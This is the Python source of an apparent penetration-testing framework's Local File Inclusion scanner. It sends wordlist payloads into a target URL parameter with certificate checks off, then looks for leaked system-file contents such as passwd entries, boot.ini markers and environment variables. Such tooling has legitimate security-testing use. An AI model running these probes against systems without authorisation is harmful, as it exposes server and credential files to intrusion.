"""Local File Inclusion (LFI) scanner module"""

import requests
import urllib.parse
from colorama import Fore, Style
from modules.base import BaseModule
from modules.payloads.wordlists import LFI_PAYLOADS

class LFIScanner(BaseModule):
    def __init__(self):
        super().__init__()
        self.description = "Local File Inclusion (LFI) vulnerability scanner"
        self.module_type = "exploit"
        self.options = {
            "URL": "",
            "PARAM": "",
            "METHOD": "GET",
            "TIMEOUT": "10",
        }
        self.required_options = ["URL", "PARAM"]
        
        self.detection_patterns = [
            "root:x:",
            "[boot loader]",
            "[extensions]",
            "<?php",
            "#!/bin/bash",
            "PATH=",
            "DOCUMENT_ROOT",
        ]
    
    def run(self):
        url = self.get_option("URL")
        param = self.get_option("PARAM")
        method = self.get_option("METHOD").upper()
        timeout = int(self.get_option("TIMEOUT"))
        
        print(f"{Fore.YELLOW}[*] Target URL: {url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Testing parameter: {param}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Method: {method}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{'='*60}{Style.RESET_ALL}\n")
        
        vulnerabilities = []
        
        for i, payload in enumerate(LFI_PAYLOADS, 1):
            print(f"{Fore.CYAN}[{i}/{len(LFI_PAYLOADS)}] Testing payload: {payload[:50]}...{Style.RESET_ALL}")
            
            if self._test_payload(url, param, payload, method, timeout):
                vulnerabilities.append({
                    "payload": payload,
                    "parameter": param
                })
                print(f"{Fore.RED}[!] VULNERABLE (LFI)!{Style.RESET_ALL}")
        
        print(f"\n{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
        
        if vulnerabilities:
            print(f"{Fore.RED}[!] Found {len(vulnerabilities)} potential LFI vulnerabilities!{Style.RESET_ALL}\n")
            for vuln in vulnerabilities:
                print(f"{Fore.YELLOW}  Param: {vuln['parameter']}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}  Payload: {vuln['payload']}{Style.RESET_ALL}\n")
            
            return {
                "success": True,
                "message": f"Found {len(vulnerabilities)} vulnerabilities",
                "vulnerabilities": vulnerabilities
            }
        else:
            print(f"{Fore.GREEN}[+] No LFI vulnerabilities detected{Style.RESET_ALL}\n")
            return {
                "success": True,
                "message": "No vulnerabilities found"
            }
    
    def _test_payload(self, url, param, payload, method, timeout):
        try:
            if method == "GET":
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                response = requests.get(test_url, timeout=timeout, verify=False)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, timeout=timeout, verify=False)
            
            for pattern in self.detection_patterns:
                if pattern in response.text:
                    return True
            
        except Exception:
            pass
        
        return False
